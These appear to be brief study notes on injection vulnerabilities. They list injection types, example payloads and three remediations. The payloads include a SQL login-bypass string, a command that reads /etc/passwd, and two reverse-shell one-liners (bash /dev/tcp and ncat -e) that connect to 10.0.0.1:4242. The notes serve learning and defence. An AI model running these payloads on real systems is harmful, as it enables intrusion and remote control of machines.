INJECTION
	WHAT IS:
	TYPES: SQL Injection, LDAP injection, OS injection, Command execution, Ruby injection, Shell Shock e etc...
	
	- what can be achieved by injection?
		*SQLi: "101 OR 1=1" (True query to do login bypass)
		*cat /etc/passwd (command to read users in linux)
		bash -i >& /dev/tcp/10.0.0.1/4242 0>&1 (one liner bash for reverse conn)
		ncat 10.0.0.1 4242 -e /bin/bash (one line nc for reverse conn)
		
	- How do we fix injection issues
		* Input Validation
		* Escaping aka Output Encoding
		* Parameterized Queries
